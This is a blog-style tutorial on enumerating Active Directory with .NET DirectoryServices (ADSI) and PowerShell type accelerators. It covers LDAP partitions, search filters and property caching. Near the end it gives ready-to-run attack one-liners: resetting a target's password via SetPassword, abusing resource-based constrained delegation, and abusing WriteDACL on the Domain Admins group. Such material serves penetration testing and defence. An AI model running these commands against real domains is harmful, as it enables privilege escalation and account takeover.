---
layout: single
classes: wide
title:  "Easy Domain Enumeration with ADSI"
---

## Introduction

Domain enumeration is always the key to Active Directory exploitation. You can abuse certain features only if you are able to find interesting object relationship. 

People have different preferences when it comes to enumeration, some might prefer to use ldapsearch, adtool, bloodhound-python on Linux and some like to use PowerView, AD Module, SharpHound on Windows. However, this post aims to show how to enumerate the domain without additional powershell modules or third party tools. This can be quite useful in certain scenarios.

When we enumerate the domain, most of the time, we are interacting with the LDAP service. There are three LDAP APIs: 

- System.DirectoryServices (ADSI for .NET)
- Active Directory Service Interfaces (ads*.dll)
- LDAP C API (wldap32.dll)

DirectoryServices is a namespace in .NET framework that provides simple programming access to LDAP directories; The [ADSI](https://docs.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi) is a **Component Object Model (COM) based** native API used to access directory services features from different network providers (such as LDAP); And the LDAP C API provides functions that enable directory client to search, retrieve and modify information from the LDAP directory service.

> All LDAP requests from a directory client ultimately go through the native LDAP C API.

This post focuses the DirectoryServices (SDS) namespace which provides us easy access to the domain objects. It is based on ADSI and it uses .NET's ability to interoperate with COM to provide a managed code wrapper around some of the ADSI interfaces. 

## DirectoryServices

There are actually three namespace we can use to interact with the LDAP service:

- System.DirectoryServices
It provides easy access to Active Directory Domain Services from managed code. The namespace contains two component classes, `DirectoryEntry` and `DirectorySearcher`, which use the Active Directory Services Interfaces (ADSI) technology. 

- System.DirectoryServices.ActiveDirectory
It provides a high-level abstraction object model that builds around AD services tasks. It is used to automate AD management tasks and is not used to access data resides within AD.

- System.DirectoryServices.Protocols
Unlike the first two namespace, it has no dependencies upon the ADSI COM-based system for directory access, it supports LDAP by calling directly into the Windows LDAP library (wldap32.dll).

I prefer to use the last namespace in my [ADCollector](https://github.com/dev-2null/ADCollector) because S.DS.P provides highest level of control and performance (and it seems like we can only create computer objects with the Protocols namespace). But this post is all about the first namespace System.DirectoryServices.

### Data Type Convention

Each LDAP data type has a corresponding ADSI data type used to represent it within the ADSI world; Each ADSI data type has a default COM data type that it will be converted to by clients using the automation-compliant APIs; Each COM data type has a default marshaling behavior in .NET determined by the .NET COM interop layer. ADSI maps each LDAP attribute to an appropriate ADSI data type and COM data type.

The .NET DirectoryServices uses two different mechanisms to translate ADSI data types to .NET data types:

- DirectoryEntry
Essentially a wrapper around the IADs interface, IADs is an _automation-compliant_ COM interface, it returns standard COM automation data types when the properties are accessed. The normal .NET/COM interop system has built-in marshaling for the standard variant types.

- DirectorySearcher
Essentially a wrapper around the ADSI IDirectorySearch interface which is _not automation compliant_, and it does not return standard COM variant types.

Automation makes it possible for one application to manipulate objects implemented in another application, or to expose objects so they can be manipulated. We will talk about this later for the DirectoryEntry.

There are two main differences between the two classes mentioned above:
1.  DirectoryEntry is used to bind directly to objects such as an AD user, computer or group whereas DirectorySearcher is used to search for one or more objects based on an LDAP filter.
2.  DirectoryEntry can be used to update object attributes whereas DirectorySearcher can only view object properties.

Additionally, a few LDAP data types converted by DirectoryEntry and DirectorySearcher could be different.

## Active Directory Partitions

To search objects in AD, first we need to understand the basic structure of the AD database and find out where we should search from. Active Directory can support tens of millions of objects and to scale up those objects, the AD database is divided up into **partitions** (aka **naming context**) for replication and administration. Each logical partition replicates its changes separately among domain controllers in the forest. See the typical structure below:

![ADPartitions](/assets/img/adenum/adpartitions.png){: .align-center}

-  Domain Partition: `DC=privatelab,DC=local`
It stores information about directory objects found in the given domain. (E.g. Users/Groups/Computers/OUs.)

-  Configuration Partition: `CN=Configuration,DC=privatelab,DC=local`
It stores information about the directory structure such as available domains/sites and domain controllers in the forest.

-  Schema Partition: `CN=Schema,CN=Configuration,DC=privatelab,DC=local`
It stores definition of all objects, along with their properties.

-  Application Partition: `DC=DomainDnsZones,DC=privatelab,DC=local` & `DC=ForestDnsZones,DC=privatelab,DC=local`
It is optional, and it stores information about a specific application, it cannot be used to store security principal obejcts. (E.g. Adding the DNS role will add DomainDnsZone/ForestDnsZone)

Most of the time, objects we want to enumerate are under the default naming context (domain partition).

## .NET Programming

### DirectoryEntry

```cs
DirectoryEntry entry = new DirectoryEntry(
			"{Provider:}//{server:port}/{hierarchy path}";
			"{username}";
			"{password}";
			{Provider Options});
```

The DirectoryEntry class contains five public constructors which allow us to initialize the Path, Username, Password and AuthenticationTypes properties directly.

The `Provider` can be "LDAP" or "GC" (for LDAP); `Server` can be DNS style name (fully qualified DNS name of DC/GC/Domain/Forest and unqualified name of Domain/Forest), NetBIOS name, IP address and null (Serverless); The `hierarchy path` would be the "distinguishedname" of objects (e.g. CN=objname,CN=Users,DC=domain,DC=local). `Username` can be the "distinguishedname", NT account name (Domain\\User), User Principal Name (user@domain.local) and plain user name. The `Provider Options` would be the Authentication Type, and we are not going to talk about it.

> The current windows security context will be used to access the directory automatically.

#### rootDSE (Root Directory Server Agent Service Entry)

The rootDSE is a shortcut for accessing the root DSE object (a DSA-specific entry which provides specific information about the directory on all servers). It is defined as the root of the directory data tree on a directory server. It can be very useful if you want to know the distinguished name of the naming contexts exposed by the directory, the schema it exposes, and the various capabilities it supports. This is how you create a new instance of the DirectoryEntry object and bind to the rootDSE:

```cs
DirectoryEntry entry = new DirectoryEntry("LDAP://rootDSE",null,null,AuthenticationTypes.Secure);

```

### DirectorySearcher
The DirectorySearcher uses a DirectoryEntry object to define the location from which to start the search in the directory tree and to define the security context used to perform the search:

```cs
using (DirectoryEntry entry = new DirectoryEntry("LDAP://DC=privatelab,DC=local"))
{
    using (DirectorySearcher ds = new DirectorySearcher(entry))
    {
        ds.Filter = "(sAMAccountName=*)";
        using (SearchResultCollection results = ds.FindAll())
        {
            foreach (SearchResult result in results)
            {
                Console.WriteLine(result.Properties["sAMAccountName"][0]);
            }
        }
    }
}

```

There are two key methods actually execute the search: `FindAll()` and `FindOne()`. FindAll returns a `SearchResultCollection` containing all search results for a given search filter whereas the FindOne returns a single `SearchResult` representing the first result in the result set (FindOne calls FindAll internally).

> The DirectorySearcher will search from the root of the domain partition if no DirectoryEntry object is provided.


### LDAP Filter

The LDAP filter determines which objects will be returned in the query. Each object in the scope of the query will be evaluated against the filter to determine whether it matches:

```
(<attribute name> <filter type> <attribute value>)`
```

This post does not cover much about the syntax, if you want to learn how to write LDAP filters, you can read [this article](https://ldap.com/ldap-filters/).

Here are some examples of the LDAP filters I used in ADCollector:

- Accounts have Unconstrained Delegation enabled (excluding Domain Controllers)
`(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))`
- User Accounts with SPN set
`(&(sAMAccountType=805306368)(servicePrincipalName=*))`
- User Accounts with interesting description
`(&(sAMAccountType=805306368)(description=*password*))`


## PowerShell Type Accelerator

Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET classes without having to explicitly type the entire class name. Luckily, two classes we need have corresponding type accelerators:

```
adsi						System.DirectoryServices.DirectoryEntry
adsisearcher		System.DirectoryServices.DirectorySearcher
```

To create an instance of the DirectoryEntry class using the type accelerator, you can supply a set of empty strings:

```powershell
[adsi]""
[adsi]"LDAP://$(whoami /fqdn)"
[adsi]"LDAP://domain.local/OU=MyOU,DC=Domain,DC=Local"
[adsi]"LDAP://10.10.10.1"
```

To create an instance of the DirectorySearcher class using the type accelerator, you can supply a set of empty strings, the empty string supplied to the DirectorySearcher class for the constructor will be interpreted as the filter: 

```powershell
[adsisearcher]""
[adsisearcher]"(ObjectCategory=user)".FindOne().Properties
```

You can also supply a DirectoryEntry object for the DirectorySearcher object so that you can define location you want to search:

```powershell
[adsisearcher]::new([adsi]"LDAP://domain.local/OU=MyOU,DC=Domain,DC=Local", "(ObjectCategory=user)").FindAll()
```

Keep in mind that only the DirectoryEntry can be used to update object properties. If we need to modify a specific attribute of an object returned in the search result, we first need to use `GetDirectoryEntry()` method to get the DirectoryEntry of the target object:

```powershell
[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry()
```

To modify an attribute of the target object, we can simply set the property value:
```powershell
#Modify the property of one object
$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry(); $entry.Properties["description"].Value = "Nothing interesting here.";$entry.CommitChanges()

#Modify the property of multiple objects
[adsisearcher]::new([adsi]"LDAP://domain.local", "(ObjectCategory=user)").FindAll()|ForEach-Object {$entry=$_.GetDirectoryEntry();$entry.Properties["description"].Value="Nothing interesting here."; $entry.CommitChanges()}
```

> Don't forget to commit changes after updating the attribute, otherwise all uncommitted changes will be lost.


### ADSI Feature

SDS provides a .NET wrapper around some but not all of the ADSI interfaces. Occasionally, it is necessary to use some of the interfaces only defined in ADSI to handle some specific data types or perform some specific operations. Reflection would be the key to ADSI.

> Reflection is essentially the ability to discover information about a type at runtime and to call members on that type. 

Essentially, we can use three methods from the DirectoryEntry object, namely Invoke, InvokeGet and InvokeSet to access ADSI features within .NET.

The Invoke method is a wrapper that allows us to invoke methods exposed by the various IADs* interfaces via late binding using the .NET reflection system under the hood. It takes the name of the method to invoke and an array of objects that defines the list as its parameter. 

InvokeGet and InvokeSet methods allow us to get and set the ADSI property value respectively. However, according to Microsoft, these two methods should not be used (see [here](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.invokeget?view=net-5.0) and [here](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.invokeset?view=net-5.0)). Of course we "can" still use them, see below comparison with "Properties"

```powershell
#InvokeGet
[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry().InvokeGet("servicePrincipalName")

[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry().Properties["servicePrincipalName"]

#InvokeSet
$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry();$entry.InvokeSet("servicePrincipalName","customspn/targetuser");$entry.CommitChanges()

$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry();$entry.Properties["servicePrincipalName"].Value="customspn/targetuser";$entry.CommitChanges()
```

The "Properties" gets the Active Directory Domain Services properties for the DirectoryEntry object whereas the "InvokeGet"/"InvokeSet" gets/sets a property from the native Active Directory Domain Services object.

They are not recommended to use because of the property cache mechanism (Feel free to correct me if I'm wrong). For example, the InvokeGet method retrieves the value from the property cache. You may encounter an error like "The directory property cannot be found in cache" if the cache is not loaded. In comparison, accessing the DirectoryEntry object attribute "Properties" will force the cache to be filled. 

> The .NET Developers Guide to Directory Services Programming: "ADSI maintains a property cache of values for an object from the directory. The property cache contains an in-memory representation of the data on the server. All reads and writes are performed on the local cache and updates do not take effect until the cache is flushed. The property cache can be filled using the `RefreshCache` method. Calling RefreshCache with no arguments will cause all of the nonconstructed attributes for the object to be loaded. Calling RefreshCache with arguments allows us to load specific attributes we want into the cache. It also allows us to load a special type of Active Directory and ADAM attribute called a constructed attribute. Constructed attributes are not actually stored in the directory but are calculated on the fly by the directory."

RefreshCache is extremely useful if we need certain constructed attributes of objects in the domain. For instance, ADCollector is able to enumerate nested group membership of domain objects. It does not simply retrieve the "memberOf" attribute of objects because this attribute only stores object's direct group membership. Instead, the "tokenGroups" attribute is retrieved since it holds both direct group membership and the recursive list of nested groups. It is a constructed attribute, its value will be calculated only when we read it. Thus, we need to use RefreshCache to load the attribute in the property cache. Here's a simple oneliner to get the nested group membership of the target object:

```powershell
$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=myuser)").FindOne().GetDirectoryEntry();$entry.RefreshCache("tokengroups");$entry.Properties["tokengroups"]|ForEach-Object{$sid=(New-Object System.Security.Principal.SecurityIdentifier($_,0)).toString();(New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])}
```

Back to the Invoke method, it could be quite handy in some cases comparing to the "not recommended" InvokeGet/InvokeSet. For example, ADSI has a interface called [IADsUser](https://docs.microsoft.com/en-us/windows/win32/api/iads/nn-iads-iadsuser), which allows us to access and manipulate end-user account data. One notable method is "SetPassword", it attempts to modify the password with different methods. First it will use the LDAP over SSL to set the password. If if failed, it will use Kerberos set password protocol to modify the password. And if that also failed, a Net* API remote procedure call will be initiated to set the password.

Imagine a scenario: During a red team engagement, you find that you have the `ForceChangePassword` permission on the target user from the BloodHound. But you cannot use the net.exe binary or for the sake of operations security, you want to avoid using the native net.exe. You can use the SetPassword method. SDS does not include a wrapper around the IADsUser interface, but we can use the Invoke method to call this ADSI method via late-bound reflection:

```powershell
[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry().Invoke("setPassword", "newpassword")
```

#### Sample Commands

Here are a few useful commands I use frequently just for reference:

- Get Domain SID

`(New-Object System.Security.Principal.SecurityIdentifier([byte[]](([adsi]"LDAP://domain.local").Properties."objectSID")[0],0)).toString()`

- Get DNS Records

`([adsisearcher]::new(([adsi]"LDAP://DC=DomainDnsZones,DC=domain,DC=local"),"(&(objectClass=*)(!(DC=@))(!(DC=*DnsZones))(!(DC=*arpa))(!(DC=_*))(!dNSTombstoned=TRUE))")).FindAll() | foreach {$_.Properties["name"] ; try{$dnsByte=[byte[]]($_.Properties["dnsrecord"][0]); if ([int]$dnsByte[2]=1) {"{0}.{1}.{2}.{3}" -f $dnsByte[24],$dnsByte[25],$dnsByte[26],$dnsByte[27]}}catch{}}`

- Get DACL of GPOs

`([adsisearcher]::new([adsi]"LDAP://CN=Policies,CN=System,DC=domain,DC=local","(objectCategory=groupPolicyContainer)")).FindAll() | foreach {$_.Properties."displayname" ; $_.GetDirectoryEntry().ObjectSecurity.Access}`

- Identify Resources-Based Constrained Delegation (RBCD)

`([adsisearcher]::new(([adsi]"LDAP://DC=domain,DC=local"),"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)")).FindAll()| ForEach-Object {$_.Properties["distinguishedname"]; ConvertFrom-SddlString (New-Object Security.AccessControl.RawSecurityDescriptor([byte[]]$_.Properties["msds-allowedtoactonbehalfofotheridentity"][0],0)).GetSddlForm([Security.AccessControl.AccessControlSections]::Access) | select DiscretionaryAcl|fl}`

- Abuse RBCD

`$targetEntry = ([adsisearcher]::new(([adsi]"LDAP://domain.local"),"(name=MYHOST)")).FindOne().GetDirectoryEntry(); $sid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=TARGETHOST)").FindOne().properties.objectsid[0],0)).toString();$sd=(New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")); $buf = (New-Object byte[] $sd.BinaryLength); $sd.GetBinaryForm($buf, 0);$targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $buf;$targetEntry.CommitChanges();`

- Abuse WriteDACL to add oneself to the target group

`$TargetUserSid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=myuser)").FindOne().properties.objectsid[0],0)).toString();$TargetEntry=[adsi]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local";$TargetEntry.PsBase.Options.SecurityMasks='Dacl';$TargetEntry.PsBase.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule(([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$TargetUserSid)), ([System.DirectoryServices.ActiveDirectoryRights]'WriteProperty'),([System.Security.AccessControl.AccessControlType]'Allow'), ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))));$TargetEntry.PsBase.CommitChanges()`


## References

- [How Active Directory Searches Work](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755809(v%3dws.10))
- The .NET Developers Guide to Directory Services Programming









